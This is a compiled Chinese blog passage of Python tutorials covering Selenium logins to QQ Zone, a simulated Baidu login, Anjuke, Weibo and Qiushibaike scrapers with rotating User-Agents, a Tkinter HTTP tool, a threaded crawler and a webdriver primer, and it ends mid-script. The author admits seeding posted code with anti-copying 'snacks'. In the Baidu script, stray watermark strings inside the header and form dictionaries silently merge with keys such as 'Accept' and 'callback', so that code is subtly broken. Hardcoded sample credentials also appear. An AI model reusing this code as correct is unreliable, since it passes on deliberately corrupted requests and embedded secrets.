&quot;(...*?)&quot;, line ([0-9]*)&quot;, &quot;selector&quot;: &quot;source.python&quot;, &quot;encoding&quot;: &quot;utf-8&quot;, &quot;env&quot;: &#123;&quot;PYTHONIOENCODING&quot;: &quot;utf-8&quot;&#125;&#125; 保存后拖回zip中覆盖，然后把.zip改回.sublime-package，覆盖回Packages目录即修改完成。 打开一个.py，敲一句print ‘hello world’, ctrl+b，成功执行。PS:不成功的原因可能是第一行cmd命令问题或encoding编码不对（如果上述法不成功，尝试将encoding的值改为第一步查看到的数值）或其它参数有问题比如我这里的variants也有问题，所以我就直接去掉了。。。。 ======================2017-09-14 更新======================另一方法：菜单中点击–&gt; 工具 –&gt; 编译系统 –&gt; 新建编译系统把里面的默认配置内容删除，改成下面这样：12345&#123; &quot;cmd&quot;: [&quot;python&quot;, &quot;$file&quot;], &quot;file_regex&quot;: &quot;py$&quot;, &quot;selector&quot;: &quot;source.python&quot; &#125; 保存，命名为python.sublime-build即可，重命名时的这个python字符串，我觉得改成其它的也可以，它只是会显示在你菜单编译系统列表里而已。关掉sublime重新打开测试，新建一个.py文件，写一个helloworld， ctrl+b 成功。 selenium 使用实例7使用Python+Selenium模拟登录QQ空间使用Python+Selenium模拟登录QQ空间爬QQ空间之类的页面时大多需要进行登录，研究QQ登录规则的话，得分析大量Javascript的加密解密，这绝对能掉好几斤头发。而现在有了selenium工具，麻麻再也不用担心你的QQ登录！ Selenium是一个WEB自动化测试工具，它运行时会直接实例化出一个浏览器，完全模拟用户的操作，比如点击链接、输入表单，点击按钮提交等。所以我们使用它可以很方便的来登录QQ空间。12345678910111213141516171819202122232425#导入selenium2中的webdriver库from selenium import webdriver#实例化出一个Firefox浏览器driver = webdriver.Firefox()#设置浏览器窗口的位置和大小driver.set_window_position(20, 40)driver.set_window_size(1100,700)#打开一个页面（QQ空间登录页）driver.get(‘http://qzone.qq.com’)#登录表单在页面的框架中，所以要切换到该框架driver.switch_to_frame(‘login_frame’)#通过使用选择器选择到表单元素进行模拟输入和点击按钮提交driver.find_element_by_id(‘switcher_plogin’).click()driver.find_element_by_id(‘u’).clear()driver.find_element_by_id(‘u’).send_keys(‘917464311’)driver.find_element_by_id(‘p’).clear()driver.find_element_by_id(‘p’).send_keys(‘123456’)driver.find_element_by_id(‘login_button’).click()#do something….#退出窗口driver.quit() 这样就能方便的登录到QQ空间，下一步就可以利用这个登录状态去抓取页面内容或其它脑洞大开的应用了~~~安装selenium库，建议直接使用pip工具 1#pip install selenium 2017-02-28 更新:有网友反映登录时出现异常，我只能表示无能为力，我只是用过selenium，并不能解决各种疑难杂症，今天又收到回复说是无法使用，我以为是腾讯改什么规则了，所以又测试了一下没发现问题，并录制了gif，如下图(点击查看高清…)：环境：64位Win10 + chromedriver(2.27) + python2.7 + 密码在运行时已经修改了:) selenium 使用实例8python抓取安居客小区数据某功能需要一套城市所有小区的位置信息数据，一开始是使用的百度地图api来进行关键词搜索，勉强能用，但数据量非常少，还是有大量的社区/小区搜不到。 周末在家上网时发现安居客上直接就有每个城市的小区大全，欣喜若狂，于是就立即写了个爬虫试试。以下贴代码，python2.7，lxml+request库。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#coding=utf-8#author : zx#date : 2015/07/27import requestsimport MySQLdbimport timeimport stringimport randomfrom lxml import etree#ua头信息 get时可以随机使用headers = [ &#123; "User-Agent":"Mozilla/5.0 (Linux; U; Android 4.1; en-us; GT-N7100 Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"&#125;, &#123; "User-Agent":"Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 520)"&#125;, &#123; "User-Agent":"Mozilla/5.0 (BB10; Touch) AppleWebKit/537.10+ (KHTML, like Gecko) Version/10.0.9.2372 Mobile Safari/537.10+"&#125;, &#123; "User-Agent":"Mozilla/5.0 (Linux; Android 4.4.2; GT-I9505 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36"&#125;]#城市入口页面#我只抓的青岛本地#其它城市或全国城市可通过这个页面抓取城市列表http://m.anjuke.com/cityListurl = 'http://m.anjuke.com/qd/xiaoqu/'req = requests.get(url)cookie = req.cookies.get_dict()#链接数据库conn = MySQLdb.connect('localhost', '*****', '******', '***', charset='utf8')cursor = conn.cursor()sql = "insert into xiaoqu (name, lat, lng, address, district) values (%s, %s, %s, %s, %s)"sql_v = [] page = etree.HTML(req.text)districtHTML = page.xpath(u"//div[@class='listcont cont_hei']")[0]#采集目标城市的各行政区域url#当然如果不想区分行政区可以直接抓“全部” 即上面url中的所有小区及分页districtUrl = &#123;&#125;i = 0for a in districtHTML: if i==0: i = 1 continue districtUrl[a.text] = a.get('href')#开始采集total_all = 0for k,u in districtUrl.items(): p = 1 #分页 while True: header_i = random.randint(0, len(headers)-1) url_p = u.rstrip('/') + '-p' + str(p) r = requests.get(url_p, cookies=cookie, headers=headers[header_i]) page = etree.HTML(r.text) #这里转换大小写要按情况... communitysUrlDiv = page.xpath(u"//div[@class='items']")[0] total = len(communitysUrlDiv) i = 0 for a in communitysUrlDiv: i+=1 r = requests.get(a.get('href'), cookies=cookie, headers=headers[header_i]) #抓取时发现有少量404页会直接导致程序报错退出- -! #唉 说明代码写的还不够健壮啊 #加了if判断和try， 错误时可以跳过或做一些简单处理和调试... if r.status_code == 404: continue page = etree.HTML(r.text) try: name = page.xpath(u"//h1[@class='f1']")[0].text except: print a.get('href') print r.text raw_input() #有少量小区未设置经纬度信息 #只能得到它的地址了 try: latlng = page.xpath(u"//a[@class='comm_map']")[0] lat = latlng.get('lat') lng = latlng.get('lng') address = latlng.get('address') except: lat = '' lng = '' address = page.xpath(u"//span[@class='rightArea']/em")[0].text sql_v.append((name, lat, lng, address, k)) print "\r\r\r", print u"正在下载 %s 的数据,第 %d 页,共 %d 条，当前:".encode('gbk') %(k.encode('gbk'),p, total) + string.rjust(str(i),3).encode('gbk'), time.sleep(0.5) #每次抓取停顿 #执行插入数据库 cursor.executemany(sql, sql_v) sql_v = [] time.sleep(5) #每页完成后停顿 total_all += total print '' print u"成功入库 %d 条数据，总数 %d".encode('gbk') % (total, total_all) if total &lt; 500: break else: p += 1#及时关闭数据库 做个好孩子 任务完成~cursor.close()conn.close()print u'所有数据采集完成! 共 %d 条数据'.encode('gbk') % (total_all)raw_input() 注释我觉得已经写的很详细了，在cmd中显示，字符串当然要转一下码。以下是运行状态和得到的数据截图。 selenium 使用实例9Python模拟百度登录本来写这个玩意儿是想用来自动登录百度，然后根据贴吧内的的排名抓取会员头像的，比如生成一个贴吧千人头像图或万人头像图。也算是练练手。完成后才发现抓那个贴吧排名完全不需要登录…也好，以后用来做自动一键签到(经常忘打卡)，抢二楼什么的，也不错~~ 如今在博客上发个文章用不了多长时间就被抄走了，感觉自己能做的也只有在此鄙视一下它们。废话太多，容易招人恨，以下是代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#-*- coding:gbk -*-## 模拟百度登录 for Python2.7# 其中显示验证码部分 需要使用PIL库# 需要验证码时，会创建一个Tkinter窗口，用于显示和输入验证码，回车后窗口关闭。# author:zx(www.zh30.com)#import urllib, urllib2, cookielib, re, timeusername = 'yourusernamehere' #用户名password = 'yourpasswordhere' #密码cookiefile = '--login-baidu--' #cookie文件#模拟header信息headers = &#123; "Host":"passport.baidu.com", "Referer":"http://www.baidu.com/cache/user/html/login-1.2.html", "User-Agent":"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36", "Origin":"http://www.baidu.com", """yufang xiao tou. this code by zhengxiao(www.zh30.om)""" "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Cache-Control":"max-age=0", "Connection":"keep-alive" &#125;cookie = cookielib.MozillaCookieJar(cookiefile)#尝试加载cookie文件并验证有效性try: cookie.load(ignore_discard=True, ignore_expires=True) print '读取登录状态的cookie成功' #do something... except Exception: #cookie不存在或无效时 开始进行模拟登录并重新生成cookie文件 opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie)) loginUrl = 'http://www.baidu.com/cache/user/html/login-1.2.html' getTokenUrl = 'https://passport.baidu.com/v2/api/?getapi&amp;class=login&amp;tpl=mn&amp;tangram=true' """www . zh30 . com """ getCodeStringUrl = 'https://passport.baidu.com/v2/api/?logincheck&amp;callback=bdPass.api.login._needCodestringCheckCallback&amp;tpl=mn&amp;charset=UTF-8&amp;index=0&amp;username=' + username + '&amp;isphone=false&amp;time=1436429688644' loginPostUrl = 'https://passport.baidu.com/v2/api/?login' #获取BAIDUID、token request = urllib2.Request(loginUrl, headers=headers) response = opener.open(request) request = urllib2.Request(getTokenUrl, headers=headers) response = opener.open(request) hasToken = response.read() token = re.search(r'login_token\s*=\s*\'(.+?)\'',hasToken).group(1) #检查username是否需要验证码 request = urllib2.Request(getCodeStringUrl, headers=headers) response = opener.open(request) getCodeString = response.read() codestring = re.search(r'"codestring":"?([^"]+)"?,', getCodeString).group(1) if codestring == 'null' : codestring = '' verifycode = '' else: #需要验证码 创建一个tk显示验证码 并提示用户输入 genimageUrl = 'https://passport.baidu.com/cgi-bin/genimage?' + codestring + '&amp;v=' + str(long(time.time()*1000)) import io, Tkinter as tk from PIL import Image, ImageTk request = urllib2.Request(genimageUrl, headers=headers) image_bytes = opener.open(request).read() pil_image = Image.open(io.BytesIO(image_bytes)) def presskey(event): global verifycode if event.keycode == 13: verifycode = entry.get() tk_root.destroy() tk_root = tk.Tk() tk_image = ImageTk.PhotoImage(pil_image) label1 = tk.Label(tk_root, text='您的帐号异常，需要输入验证码') label1.pack() label2 = tk.Label(tk_root, image=tk_image) label2.pack() label3 = tk.Label(tk_root, text='输入验证码并按回车确认') label3.pack() entry = tk.Entry(tk_root) entry.bind('&lt;Key&gt;', presskey) entry.pack() tk_root.mainloop() #构造登录表单 data = &#123; "ppui_logintime":"134198", "charset":"utf-8", "codestring":"", "isPhone":"false", "index":"0", "u":"", "safeflg":"0", "staticpage":"http://www.baidu.com/", "loginType":"1", "tpl":"mn", """yufang xiao tou. this code by zhengxiao""" "callback":"parent.bdPass.api.login._postCallback", "mem_pass":"on" &#125; data['token'] = token data['username'] = username data['password'] = password data['codestring'] = codestring data['verifycode'] = verifycode #开始登录 req = urllib2.Request(loginPostUrl, urllib.urlencode(data), headers) result = opener.open(req).read() #验证登录结果 errno = re.search(r'&amp;error=(\d+)', result).group(1) if errno == '0': print '登录成功' cookie.save(ignore_discard=True,ignore_expires=True) elif errno == '4': print '登录失败：密码错误' elif errno == '257': print '登录失败：验证码错误' else: print '登录失败' print result #失败后 打印返回字符 by zh30.com 百度登录时，主要有四个步骤。第一步：访问任意百度页面，得到名为BAIDUID的cookie第二步：根据cookie去请求得到token（登录时要提交这个值）。第三步：验证username是否需要验证码。返回值中如果存在codestring，说明需要验证码，然后根据这个codestring请求得到验证码。第四步：提交登录表单，检查登录状态，记录cookie。判断登录是否成功，可以检查是否生成名为BDUSS的cookie，郑晓在这里判断的是返回字符串中的跳转链接，成功时error参数为0。have fun! selenium 使用实例10用TKinter实现的一个简版HTTP请求模拟器平时开发过程中经常会遇到需要模拟POST或GET请求的时候，当然GET一般直接通过浏览器也可以，方便快捷。郑晓看到网上也有不少软件版的HTTP模拟器，功能也非常强大。郑晓最近在学习Python，正好手闲的慌，就用Python自带的TKinter库写了个HTTP模拟工具，功能比较简单，只是实现了基本的功能。 最近我发现有的网站复制了我的文章，还把里面的各种信息都替换成了他自己的，还自己运行了程序截的图，也是挺郁闷的…所以以后发的代码中，郑晓可能会随机在其中加一点儿小点心… 这个tkinter的http模拟器代码如下，开发环境(win7 + Python2.7)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374# -*- coding: utf-8 -*-from Tkinter import *from ttk import *from urlparse import urlparseimport urllib#提交时的响应事件def btn_submitOp(e): #获取输入的值 并进行编码 url = entry_url.get().encode("utf-8") entry_query = entry_para.get().encode("utf-8") result = "请求的地址：" + url result = result + "\n请求的方式：" + ["GET", "POST"][v.get()] result = result + "\n请求的参数：" + entry_query url_parse = urlparse(url) query = url_parse.query.strip('&amp;') +entry_query #POST(请求原始URL， 使用编码后的参数) try: if v.get() == 1: r = urllib.urlopen(url, entry_query) #GET(根据提交的参数重新组合URL) else: url = url_parse.scheme+"://"+url_parse.netloc+url_parse.path+"?%s" % query article_from_zhengxiao_blog_www_zh30_com = 0 r = urllib.urlopen(url) data = r.read() except: data = "\n请求失败！" result = result + "\n" + "-"*28 + '请求返回结果' + "-"*28 + data #将结果输出(更新)到文本域 text_result.delete(0.0, END) text_result.insert(1.0, result)#####创建窗口#####app = Tk()app.title("HTTP请求模拟 v0.1")app.geometry('500x500')#####创建控件######第一行 地址lbl_url = Label(app, text="请求地址：")lbl_url.grid(row=0, column=0, sticky=W, pady=5, padx=10)entry_url = Entry(app, width=50)entry_url.grid(row=0, column=1, sticky=W)#第二行 方式lbl_addr = Label(app, text="请求方式：")lbl_addr.grid(row=1, column=0, sticky=W, pady=5, padx=10)fm1 = Frame()fm1.grid(row=1, column=1, sticky=W)v = IntVar()v.set(1)btn_method = Radiobutton(fm1, variable=v, value=1, text="POST")btn_method.pack(side = LEFT)btn_method = Radiobutton(fm1, variable=v, value=0, text="GET")btn_method.pack()#第三行 参数lbl_para = Label(app, text="请求参数：")lbl_para.grid(row=2, column=0, sticky=W, padx=10)entry_para = Entry(app, width=50)entry_para.grid(row=2, column=1, sticky=W)#第四行 提交btn_submit = Button(app, text="发送请求")btn_submit.bind('&lt;Button-1&gt;', btn_submitOp)btn_submit.grid(row=3, column=0, sticky=W, padx=10,pady=10)#第五行 返回结果text_result = Text(app, width=68, height=25)text_result.grid(row=4, column=0, columnspan=2, sticky=W, padx=10)#第六行 其它Label(app, text="-- by 郑晓").grid(row=5, column=1, sticky=E, padx=10, pady=10)app.mainloop() 过程式编程看上去比较乱… 以下是运行截图，测试请求的是图灵机器人聊天接口。python-tkinter-http请求模拟器 selenium 使用实例11web.py使用session时报错AttributeError的解决办法web.py使用session时报错AttributeError的解决办法最近在学习web.py使用session时，经常会遇到AttributeError错误，大体报错内容是:AttributeError: ‘ThreadedDict’ object has no attribute ‘xxxxx’网上找的解决办法都是关闭web.py的调试模式，但有时关闭后也会报错，很是郁闷。 最后郑晓摸索出了使用session时需要注意的几点，在这里记录一下： 首先请关闭调试模式： web.config.debug = False代码需加到import web后，调用web.application之前，像这样： import web web.config.debug = False urls = (‘/‘, ‘index’) app = web.application(urls, globals()) 创建session时，加上initializer参数，给你的session设置个默认值，像这样： session = web.session.Session(app, web.session.DiskStore(‘sessions’), initializer={‘user’:None, ‘login’:None})按说不加initializer也应该可以使用啊，不知道为什么我不加的话，就会报错，不管你是不是判断了is not None，只要你调用了session.xxx就报错。 3.最囧的一点：删除之前创建的sessions文件。上一步中，郑晓设置了将session以文件的形式储存到当前目录下的sessions目录中。所以在上二步确认无问题后，手动将sessions目录中的已存在的文件删除。不删除的话，程序还是使用的旧版session，还会报错- -！ 4.have fun! selenium 使用实例12python函数式实现的多线程爬虫练习写的一个爬虫练习，目的是抓取目标站点下所有链接， 并记录下问题链接url（包括问题url，入口链接，http状态码）。可以自行设置线程数量，程序开启一个子线程来维护当前线程数量。之前还好点儿，现在是越改bug越多，问题越多。 目前发现的问题有：1.线程的管理上，之前用传统的方法，三个for循环来创建固定数量线程，不过发现如果某线程抛出异常后，线程终止，总线程数就会减少。所以自己改成了用一个死循环不停的监听活动线程数量。发现执行过程中，线程name的数量不断增长，每一个创建的线程在执行完一次方法后好像就退出了。。。2.url_new列表保存待抓取的url，发现还是有重复的现象。 感觉用函数式的线程实现的话，线程间的同步好像不太好。。3.lock有问题。。。因为自己还是没有掌握lock的锁法，发现url有重复时，自己把整个def都用lock锁了起来。。 还是问题不断啊。。4.目标站还是写死在程序中。。。待改进为面向对象！123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115#encoding: gb2312import urllib2import threadingimport loggingimport reimport sysimport osfrom bs4 import BeautifulSoupreload(sys)sys.setdefaultencoding("utf-8")#日志初始化FILE = os.getcwd()logging.basicConfig(filename=os.path.join(FILE, 'log.txt'),level=logging.DEBUG)#待抓取的任务队列url_new = [('none','http://www.xxxxxx.com/')]#已完成的任务url_old = []#已完成的状态url_err = &#123;200:[]&#125;#锁lock = threading.Lock()lock2= threading.Lock()#线程执行主方法#从任务列表中获取一条url进行抓取#分析url，去重复，将得到的urls重新放入任务列表#保存当前url的访问状态def geturl(): global url_new try: while True: lock.acquire() if len(url_new)&lt;=0: lock.release() continue url_t = url_new.pop(0) url = url_t[1] try: req = urllib2.urlopen(url) except urllib2.HTTPError, e: #记录到对应的列表中 if url_err.has_key(e.code): url_err[e.code].append((url,url_t[0])) else: url_err[e.code] = [(url,url_t[0])] with open('log.html', 'a+') as f: f.write(str(e.code)+'：'+url+', 来路：'+url_t[0]+'&lt;br&gt;') continue else: url_err[200].append(url) with open('log.html', 'a+') as f: f.write('200：'+url+', 来路：'+url_t[0]+'&lt;br&gt;') #记录到已访问的列表中 url_old.append(url) #开始提取页面url soup = BeautifulSoup(req.read().decode('UTF-8', 'ignore')) alink= soup.find_all('a', attrs=&#123;'href':re.compile(".*?xxxxxx.*?")&#125;) tmp_url = [] for a in alink: href = a.get('href') tmp_url.append(a.get('href') if a.get('href').find('http:')&gt;=0 else 'http://www.xxxxxx.com'+a.get('href')) tmp_url= &#123;&#125;.fromkeys(tmp_url).keys() for link in tmp_url: if link not in url_old: url_new.append((url, link)) tmp = [] for i in xrange(len(url_new)): if url_new[i][1] not in tmp: tmp.append(url_new[i][1]) else: del url_new[i] #url_new = &#123;&#125;.fromkeys(url_new).keys() #输出一下状态信息 os.system('cls') print threading.Thread().getName()+":当前线程数："+str(threading.activeCount())+"，当前剩余任务量："+str(len(url_new))+", 已访问:"+str(len(url_old)) for k in url_err.keys(): print str(k)+'：'+str(len(url_err[k])) lock.release() except Exception as e: logging.debug(str(e)) lock.release()#线程数检测 死循环持续检测当前活动线程数#不够数量时自动创建启动新线程def threadcheck(num): t=threading.Thread(target=geturl) t.start() t.join()#定义主方法def main(): """初始 创建200个线程 for i in xrange(190): t = threading.Thread(target=geturl) threads.append(t) for i in xrange(190): threads[i].start() for i in xrange(190): threads[i].join()""" t = threading.Thread(target=threadcheck, args=(10,)) t.start() t.join() #geturl(url_new.pop(0))#开始if __name__ == '__main__': main()input('整站抓取已结束！') qpython – 安卓上的python编辑利器!在手机上敲代码纯属娱乐，输入速度比较蛋疼，不过装上玩玩也好。所以一直想找个可以在android安卓手机上编辑和运行python的软件。之前就尝试安装过qpython，不过是基于python2.7的。我是学习的python3，所以就一直没用。今天在三星app商店里找到了基于python3.2版本的qpython３,所以在这里拿出来分享给各位安卓控们。 以下是两个软件的部分截图，功能很全。在手机上玩python的利器，Qpyton。这里提供了qpython的python2.7(即qpython0.9.7.3版)和python3.2(名字为qpython3，安装后名字叫Qpython+)的两个版本。qpythonqpython3 selenium 使用实例13python采集新浪热门微博这是之前学习python采集时的一个练习程序，程序基于python3和BeautifulSoup库。用来抓取新浪微博（热门微博hot.weibo.com）页面的信息，包括每条微博的发布人，微博内容和包含的图片，微博中含有的多张图片采集为一个图片列表。 由于在页面中没有发现比较精确的发布时间字段，所以也没有去弄（目前思路是获取到它的页面中的时间信息，然后做判断去转换）。这里以热门笑话的一个页面做为采集对象。 1234567891011121314151617181920212223242526272829303132#-*-coding:utf-8 -*-from bs4 import BeautifulSoupimport urllib.request#伪造的headerheaders = &#123;'User-Agent':'Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36'&#125;#抓取地址 读入页面源文件fromurl='http://hot.weibo.com/?v=1899&amp;page=2'r = urllib.request.Request(url=fromurl, headers=headers)response=urllib.request.urlopen(r)page=response.read()#实例化BS对象soup= BeautifulSoup(page)#定位到微博信息主节点 页面中每一条微博是它的子节点tags = soup.find_all(name='div', attrs=&#123;'class':'WB_detail'&#125;)#遍历所有子节点for tag in tags: #从子节点中找到发布人 sender = tag.find(name='a', attrs=&#123;'class':'WB_name S_func1'&#125;).get_text() #从子节点中找到微博内容 text = tag.find(name='div', attrs=&#123;'class':'WB_text'&#125;).get_text() #查找节点下的微博图片 thumbList = tag.find_all(name='img', attrs=&#123;'class':'bigcursor'&#125;) img = [] #如果有图，把所有图片的地址放到img数组中 if thumbList: for t in thumbList: img.append(t['src']) print(sender+text) print(img) print() print()input() python抓取糗百信息并入库mysql这里抓取的页面是糗百的最近8小时糗事页面。感觉它的列表规则比较简单一些。学习pytho的urllib库基本操作与mysql的基础使用。连接mysql使用的是mysql自家的connector。http://dev.mysql.com/doc/connector-python/en/index.html环境win2003+python3.3代码如下。1234567891011121314151617181920212223242526272829#导入urllib、mysql和正则类库import urllib.requestimport mysql.connectorimport re#设置要抓取的页面url="http://www.qiushibaike.com/8hr/page/1"#模拟访问页面，抓取页面内容到page变量中response=urllib.request.urlopen(url)page=response.read()#匹配糗事正文及图片的正则p = re.compile(r'&lt;div class="content" title="([\d\-\s:]+)"&gt;([^&lt;]*(?=&lt;br\/&gt;[^&lt;]+)*)&lt;\/div&gt;(?=\s*&lt;div class="thumb"&gt;\s*&lt;a[^&gt;]+&gt;\s*(&lt;img[^&gt;]+\/&gt;)\s*&lt;\/a&gt;\s*&lt;\/div&gt;)?')#对抓取的utf8的内容转为unicode 并执行匹配 将匹配结果放到resultlist列表。resultlist = p.findall(page.decode('utf-8'))print(resultlist)#以下是数据库操作部分#数据库连接配置字典conn = &#123;'host':'localhost', 'user':'root', 'password':'flake', 'database':'test'&#125;#建立数据库连接conn = mysql.connector.connect(**conn)#获得游标cursor = conn.cursor()#插入数据库的sql 将内容中的换行符直接替换掉insertSql = "insert into qiubai (dates, text, img) values (%s, replace(replace(%s,'\n',''),'\r',''), %s)"#执行批量插入操作cursor.executemany(insertSql, resultlist)#关闭游标及数据库连接cursor.close()conn.close()input() python-tkinter的键盘事件监听python-tkinter的键盘事件监听的实现，特殊字符直接打印是不会显示的，但都是正常的。1234567891011121314#导入tkinterfrom tkinter import *#定义的方法 监听键盘事件def printkey(event): print(&apos;你按下了: &apos; + event.char)#实例化tkroot = Tk()#实例化一个输入框entry = Entry(root)#给输入框绑定按键监听事件&lt;Key&gt;为监听任何按键 &lt;Key-x&gt;监听其它键盘，如大写的A&lt;Key-A&gt;、回车&lt;Key-Return&gt;entry.bind(&apos;&lt;Key&gt;&apos;, printkey)#显示窗体entry.pack()root.mainloop() 结果如下： 转自:https://www.zh30.com 自动化测试 selenium 模块 webdriver使用（一）一、webdriver基本使用命令1from selenium import webdriver # 导入webdriver模块 1234567&gt;&gt;&gt; chrome_obj = webdriver.Chrome() # 打开Google浏览器&gt;&gt;&gt; chrome_obj.get("https://www.baidu.com") # 打开 网址 &gt;&gt;&gt; chrome_obj.get(r"C:\desktop\text.html") # 打开本地 html页面 &gt;&gt;&gt; chrome_obj.title # 获取打开网址 的名字 &gt;&gt;&gt; chrome_obj.current_url # 获取打开网址的 url&lt;br&gt;&lt;br&gt;&gt;&gt;&gt; chrome_obj.close() #关闭浏览器窗口 二、标签导航 普通 定位标签 1234567891011# 查找标签&gt;&gt;&gt; label = chrome_obj.find_element_by_id("kw")&gt;&gt;&gt; label = chrome_obj.find_element_by_name("wd")&gt;&gt;&gt; label = chrome_obj.find_element_by_class_name("s_ipt")&gt;&gt;&gt; label = chrome_obj.find_element_by_tag_name("imput") &gt;&gt;&gt; label = chrome_obj.find_element_by_link_text("a标签中的内容 准确定位") &gt;&gt;&gt; label = chrome_obj.find_element_by_partial_link_text("a标签中的内容 模糊定位 ") &gt;&gt;&gt; label = chrome_obj.find_element_by_xpath(“放入 copy 标签中的常css路径”)&gt;&gt;&gt; label = chrome_obj.find_element_by_css_selector(“input=[id='id_name'/name='name_name'/……/]") 标签导航 xpath 标签定位复杂的情况下 考虑使用xpath XPath即为XML路径语言，它是一种用来确定XML（标准通用标记语言的子集）文档中某部分位置的语言。XPath基于XML的树状结构，有不同类型的节点，包括元素节点，属性节点和文本节点，提供在数据结构树中找寻节点的能力。 123456789101112131415161718192021222324252627282930313233343536373839# 绝对路径&gt;&gt;&gt; label = chrome_obj.find_element_by_xpath("html/boday/p/input") # 绝对路径 导航&gt;&gt;&gt; label = chrome_obj.find_element_by_xpath("html/boday/p/input[1]") # 绝对路径导航，多个input框，确定第一个input框#相对路径&gt;&gt;&gt; label = chrome_obj.find_element_by_xpath("//input") # 相对路径导航 表示 整个文档当中的 input标签 默认为第一个 * 第一个“//” 表示 在整个文档中&gt;&gt;&gt; label = chrome_obj.find_element_by_xpath("//input[2]") # 指定页面中的第二个 input框 没有就报错 # 父节点下找子节点&gt;&gt;&gt; label = chrome_obj.find_element_by_xpath("//form//input") # // 父节点//子节点 * 返回子节点 input&gt;&gt;&gt; label = chrome_obj.find_element_by_xpath("//form//input[2]") # // 父节点//子节点 [2] * 指定 父节点下的 第二个 input子节点# 通过子节点 定位父节点&gt;&gt;&gt; label = chrome_obj.find_element_by_xpath("//form//input/..") # 返回input的父节点 form 标签&gt;&gt;&gt; label = chrome_obj.find_element_by_xpath("//form//input/.") # 当前节点# 通过属性查找节点&gt;&gt;&gt; label = chrome_obj.find_element_by_xpath("//input[@id]") # 相对路径导航 找到所有的 input标签 其中有 id属性的标签&gt;&gt;&gt; label = chrome_obj.find_element_by_xpath("//input[@id='1']") # 属性查找 在所有的input标签中 找到 具有 id=1 的input标签 &gt;&gt;&gt; label = chrome_obj.find_element_by_xpath("//input[@name='xiahua']") # 标签统计 countains&gt;&gt;&gt; label = chrome_obj.find_element_by_xpath("//*[countains(input)=1]") # //* 表示 整个文档中 的所有标签，[count(input)=1] 表示 父标签下只有 一个input子标签 的 input标签&gt;&gt;&gt;label = chrome_obj.find_element_by_xpath("//*[countains(input)=2]") # //* 表示 整个文档中 的所有标签，[count(input)=1] 表示 父标签下有 两个input子标签 的 input标签# local-name 模糊查找 &gt;&gt;&gt; label = chrome_obj.find_element_by _xpath("//*[local-name()='input']") # 查找当前文档中 的所有input标签 默认返回第一个&gt;&gt;&gt; label = chrome_obj.find_element_by _xpath("//*input") # 查找当前文档中 的所有input标签 默认返回第一个&gt;&gt;&gt; label = chrome_obj.find_element_by _xpath("//*[local-name(),'i']") # 查找当前文档中 标签名字中 包含字母 i的标签，比如 input title&gt;&gt;&gt; label = chrome_obj.find_element_by _xpath("//*[local-name(),'i']") # 查找当前文档中 的所有input标签 默认返回第一个&gt;&gt;&gt; label = chrome_obj.find_element_by _xpath("//*[countains(local-name(),'i')] [last()]) # 查找当前文档中 所有包含 字母“i”的 标签 的子标签 的 最后一个元素 （有点懵逼）&gt;&gt;&gt; label = chrome_obj.find_element_by _xpath("//*[strint-length(local-name()=3)] [last()]) # 查找当前文档中 所有 标签字符个数为5的标签，并且制定返回 最后一个标签。 title input（5个str） 三、 模拟用户操作123456789&gt;&gt;&gt; label.get_attribute("type") # 显示标签的type属性 name type id placeholder&gt;&gt;&gt; label.tag_name() #获取标签名字 input p form …… &gt;&gt;&gt; label.size&gt;&gt;&gt; label.id &gt;&gt;&gt; chrome_obj.maximize_window()# 窗口最大化 &lt;br&gt;&gt;&gt;&gt; #模拟鼠标悬浮&gt;&gt;&gt; label.click() # 模拟a标签 点击事件&gt;&gt;&gt; label.send_keys("模拟搜索内容") # 模拟input框 输入内容&gt;&gt;&gt; label.clear() # 清除input标签中 输入的内容&gt;&gt;&gt; chrome_obj.back() # 模拟浏览器 返回上一个浏览页面 1、模拟鼠标操作1234567891011121314151617from selenium.webdriver.common.action_chains import ActionChains #导入模块 &gt;&gt;&gt; label = chrome_obj.find_element_by_link_text("点我 悬浮 显示其他 a标签") &gt;&gt;&gt; ActionChains(chrome_obj).move_to_element(label).perform() # 模拟用户悬浮""" ActionChains(chrome_obj) 用于生成模拟用户行为 ；perform() 执行存储行为 """&gt;&gt;&gt; label_bel = chrome_obj.find_element_by_link_text("我是 a标签，点我页面跳转")&gt;&gt;&gt; label_bel.click() # 模拟用户点击 其他鼠标操作label.countext_lick() # 右击label.double_click() # 双击label.drag_and_drop() # 拖动label.move_to_element # 悬浮label.click_and_hold # 按鼠标左键一直不动 2、模拟键盘操作12345678910111213141516from selenium.webdriver.common.keys import Keys # 引入模块 &gt;&gt;&gt; label.send_keys("input输入的内容") &gt;&gt;&gt; label.send_keys(Keys.BACK_SPANCE) # 退格键 &gt;&gt;&gt;label.send_keys(Keys.CONTRL,'a') # 全选 &gt;&gt;&gt;label.send_keys(Keys.CONTRL,'v') # 粘贴 &gt;&gt;&gt;label.send_keys(Keys.CONTRL,'c') # 复制 &gt;&gt;&gt;label.send_keys(Keys.CONTRL,'x‘’) # 剪切 &gt;&gt;&gt;label.send_keys(Keys.ENTER) # 回车 四、处理对话框 python脚本实现自动登录 1234567891011121314151617181920212223242526272829303132333435363738394041from selenium import webdriverimport timedef automatic_login(name,pwd,url): chrome = webdriver.Chrome() chrome.get(url) time.sleep(2) chrome.maximize_window() time.sleep(5) chrome.find_element_by_xpath("/html/body/div[3]/div[2]/div[3]/div/div").click() chrome.find_element_by_link_text("登录").click() time.sleep(5) name_label = chrome.find_element_by_id("id_account_l") 